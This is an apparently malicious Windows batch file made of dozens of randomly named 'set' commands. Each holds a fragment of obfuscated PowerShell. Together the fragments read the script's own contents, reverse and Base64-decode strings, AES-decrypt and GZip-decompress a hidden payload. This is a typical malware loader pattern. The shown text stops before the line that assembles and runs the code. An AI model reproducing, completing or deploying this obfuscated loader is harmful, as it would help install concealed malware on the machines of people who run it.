@echo off
set "iAzwctctuB=$lfi"
set "dPYYEoOobZ=in $"
set "XDcGdppDXW=zuZI"
set "KKniGFsIXP=DsSw"
set "oOhnEaPBMz=VGy."
set "mABTeqaXFe=C, 0"
set "lkkyMUmSvj=ss -"
set "zIOhdydRcC=stem"
set "vZuDOjikyy=am;$"
set "nFjvMfUAMK=7;$d"
set "yjTBfzvTMV=Fouv"
set "yYpwJTobux=ewLi"
set "fNDvRVqwJw=Am ="
set "nONMBAitva=Sw.I"
set "GMklhPbnMi=nirt"
set "TYEQnZnNZu=).Sp"
set "sDTRhoZvCi=oL'["
set "uKeXksXSCs=eam("
set "iCvDGOEwqa=morF"
set "ltBHZKXZof=ring"
set "JKVyezOfjq=..-1"
set "uaArHfeUah=Jp.D"
set "HhLjxKBwtY= [Sy"
set "sFYHpnCaUg==');"
set "PDIgfXjQOK=oint"
set "icbeHDjsNj=.IO."
set "WVcQxkbPTN=-joi"
set "sdsbrQfrQk= New"
set "GFckYfTuDk=rtS4"
set "uGzjBHIFQQ=hiq "
set "zPbjiGPlqy=);$d"
set "AwaFfxPzdv=fore"
set "kJmDmUmCSx=dj0C"
set "LnWQagqlpe=tion"
set "WvhMikJgXg=DsSw"
set "erIwgGndqi=);$R"
set "NsARWfwpWC=trea"
set "sFtYfVhAdF=k; }"
set "HhmlKfXasO=.Mem"
set "lVtVFbwMTf=gnir"
set "RHtuKBRuFq=pher"
set "XPDgbPmhGE=L4Yi"
set "QKOifOKEhv=pose"
set "OvlZsvAoyu='[-1"
set "gIjqXtfnPl=ateD"
set "yfTXqiHApn== $d"
set "TAGhkEwgGU=ach "
set "mQqxOHLvOm=mory"
set "NyscoRXGGt=ck($"
set "aOHLCRJMVF=form"
set "JhgHKTYJof=$vJZ"
set "jtGTlCOBaB=('da"
set "UueHpGUphq=rans"
set "sZyzedhyKL=V = "
set "LELFJJaBYN=Disp"
set "MEkfcBOecb=F'[-"
set "nDirscQTiC=('%~f0'"
set "pKaYtUBEio=se()"
set "EkxnjIcTld=ress"
set "XAEEiSBvPw===')"
set "jPDOybYJrl=VGy "
set "bzLvsQMTly=QCi "
set "CNoNmRqrBZ=)))"
set "GGCaYCPupL=-4] "
set "XVDMJQPXFV=tem."
set "STjYYqHAYq=FomB"
set "VDbfzfpKmV=urit"
set "qMGsmCCOpa=ixR."
set "oqntRMysYn=zHhH"
set "YWrGvRHwAT=ptog"
set "MiDaPwGMPA=.Cry"
set "oTLebDeHMQ=);$t"
set "jtFhuhVWmt=hy.A"
set "YYfZzGGaTc=Comp"
set "uVQdKeSPrV=oin "
set "FFsjlCGfEW=Ci.T"
set "huEkUCqxEz=yste"
set "EuhByCiOvT=:('g"
set "EasfGDODVx=em.I"
set "ZneriojmSi=VNVG"
set "LQCxZyjXsN=Bmor"
set "pqVVjSZeZy=null"
set "GKIWGWQIsH=.GZi"
set "TXrsaMmfOB=ptog"
set "GJLbVcfXdp=.Cop"
set "FAJFPyxFsb= [Sy"
set "VefTjQdEkA=16] "
set "dLqbxfWLve=pres"
set "aNNuurAPMP=omBC"
set "fMHzqroNof=orF'"
set "UUSfEgwKYX=ress"
set "VPXHXNFuNV=);$d"
set "pImLszeVLD=sion"
set "WYcIwXipFQ=::De"
set "tuShBnBctW=onve"
set "lLsMfaAhUp=join"
set "HABTPDdWtj=.Con"
set "FfMaURFBRQ=th('"
set "HYQiJKOfiw=BC;$"
set "xpFIPgnxZt=DsSw"
